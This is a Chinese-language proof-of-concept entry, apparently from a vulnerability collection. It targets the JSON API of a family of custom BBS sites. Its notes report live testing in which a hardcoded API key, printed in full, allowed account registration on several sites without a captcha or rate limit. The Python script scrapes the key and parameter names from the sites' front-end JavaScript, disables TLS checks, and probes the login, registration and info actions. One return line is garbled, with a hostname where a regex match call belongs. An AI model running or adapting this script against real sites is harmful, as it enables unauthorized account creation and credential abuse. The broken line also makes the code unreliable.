# 自研BBS 站群 JSON API 硬编码密钥 + 接口协议逆向

- **code**: 自研bbs-站群-json-api-硬编码密钥-接口协议逆向
- **kind**: poc
- **category**: unauthorized
- **component**: 自研BBS (bbsapiext.php)
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-15 实测 example.com/bbs/bbsapiext.php：k=rjnjgkalsdi12 注册成功 {"reflag":1,"reinfo":"ok","dataArray":152}；密钥错误 {"reflag":-3,"reinfo":"args is invalid "}。同族 3 个站点同密钥同协议全部生效。
- **path**: pocs/自研bbs-站群-json-api-硬编码密钥-接口协议逆向/bbs_api_probe.py
- **tags**: 自研cms,api,硬编码密钥,注册接口,站群
- **created_at**: 2026-10-15T20:39:30.182Z
- **found_by**: vuln-scan

## 描述

自研BBS 站群（曾道人/百老汇）统一使用 bbsapiext.php JSON API，接口密钥 k 硬编码在前端 JS。动作：bbslogin（登录）、bbsreg（注册）。返回码语义：-99 动作不存在 / -3 密钥错 / -10 -20 参数校验 / -1 凭据错 / 1 成功。注册无验证码无频率限制，返回 dataArray 即用户自增ID。

## 用法

```
python3 bbs_api_probe.py example.com 443 1
# 该密钥 k=rjnjgkalsdi12 在同族站点通用（target423.example.com / target424.example.com / target425.example.com 全部生效）
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""自研BBS JSON API 硬编码密钥探测 + 接口动作枚举。

要点：
  1) 密钥 k 硬编码在前端 login.php / register.php 的 $.ajax 里
  2) 用返回码区分为：-99=动作不存在, -3=密钥错误, -10/-20=参数校验, -1=凭据错
  3) 前端 JS 可直接抠出所需的全部参数名

用法: python3 bbs_api_probe.py <host> <port> <tls 0|1>
"""
import json
import re
import socket
import ssl
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "example.com"
PORT = int(sys.argv[2] if len(sys.argv) > 2 else 443)
TLS = (sys.argv[3] if len(sys.argv) > 3 else "1") == "1"

# 从页面 JS 提取密钥（自动化）
def fetch(path):
    s = socket.create_connection((HOST, PORT), timeout=12)
    if TLS:
        c = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        c.check_hostname = False
        c.verify_mode = ssl.CERT_NONE
        s = c.wrap_socket(s, server_hostname=HOST)
    s.sendall((f"GET {path} HTTP/1.1\r\nHost: {HOST}\r\n"
               f"User-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n").encode())
    d = b""
    while len(d) < 300000:
        x = s.recv(16384)
        if not x:
            break
        d += x
    s.close()
    return d.decode("gb18030", "ignore")

page = fetch("/bbs/login.php")
key = re.findall(r"k\s*:\s*['\"]([^'\"]+)['\"]", page)
print("[+] 硬编码密钥:", key)
KEY = key[0] if key else ""

# 从注册页拿全参数名
reg = fetch("/bbs/register.php")
params = re.findall(r"(\w+)\s*:\s*txt(\w+)", reg)
print("[+] 注册参数映射:", params)

def post(action, extra=""):
    body = f"p={action}&k={KEY}{extra}"
    s = socket.create_connection((HOST, PORT), timeout=12)
    if TLS:
        c = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        c.check_hostname = False
        c.verify_mode = ssl.CERT_NONE
        s = c.wrap_socket(s, server_hostname=HOST)
    bb = body.encode()
    s.sendall((f"POST /bbs/bbsapiext.php HTTP/1.1\r\nHost: {HOST}\r\n"
               f"Content-Type: application/x-www-form-urlencoded\r\n"
               f"Referer: http{'s' if TLS else ''}://{HOST}/bbs/login.php\r\n"
               f"Content-Length: {len(bb)}\r\nConnection: close\r\n\r\n").encode() + bb)
    d = b""
    while len(d) < 200000:
        x = s.recv(16384)
        if not x:
            break
        d += x
    s.close()
    m = re.search(rb"\{.*\}", d, re.S)
    return target22.example.com(0).decode("utf-8", "ignore") if m else ""

for a in ["bbslogin", "bbsreg", "bbsgetinfo", "bbslist"]:
    print(f"  p={a:<12} -> {post(a)[:130]}")

```
